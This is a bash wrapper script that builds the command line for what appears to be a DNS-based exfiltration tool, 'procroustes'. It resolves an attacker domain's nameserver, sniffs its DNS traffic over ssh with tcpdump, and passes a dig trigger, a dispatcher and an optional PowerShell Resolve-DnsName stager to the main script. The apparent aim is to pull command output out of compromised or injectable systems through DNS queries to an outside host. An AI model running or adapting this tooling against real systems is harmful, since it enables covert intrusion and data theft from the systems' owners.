#!/bin/bash

#not complete but should work fine for most cases
function get_ns {
    local current_ns
    current_ns=$1
    while :;do
        current_ns=$(dig @$(dig +short ns ${current_ns#*.}|head -n1) $current_ns|fgrep -A 1 ';; AUTHORITY SECTION'|tail -n1|awk '{print $5}')
        [[ ! -z $(dig +short a +tries=1 +time=4 $current_ns) ]] && break
    done
    echo $current_ns
}

prepend_text="ssh yourns 'stdbuf -oL tcpdump --immediate -l -i any udp port 53'|"

use_full_script=1 #chunked=0 full=!0
dns_host=yourdns.host
dns_trigger="dig @debug_server"
dispatcher=path/to/dispatcher


#######staged params#######
#nsconfig=path/to/nsconfig
#stager_dns_cmd='Resolve-DnsName -Server debug_server -Name %host% -ty a|? Section -eq Answer|Select -Exp IPAddress'
######end of staged params#######


scr=./procroustes_full.sh
[[ $use_full_script -eq 0 ]] && scr=./procroustes_chunked.sh

[[ -z $dns_host_ns ]] && dns_host_ns=$(get_ns $dns_host)


#prefix with e_ to have the output escaped
for var in "${!e_@}";do
    declare -n tmp="$var"
    tmp=$(printf %q "$tmp")
done

params=""
params="${params} -h '$dns_host'"
params="${params} -d '$dns_trigger'"
params="${params} -x '$dispatcher'"
[[ ! -z $nsconfig ]] && params="${params} -z '$nsconfig'"
[[ ! -z $stager_dns_cmd ]] && params="${params} -k '$stager_dns_cmd'"

printf '%s%s%s -- %q' "$prepend_text" "$scr" "$params" "$*"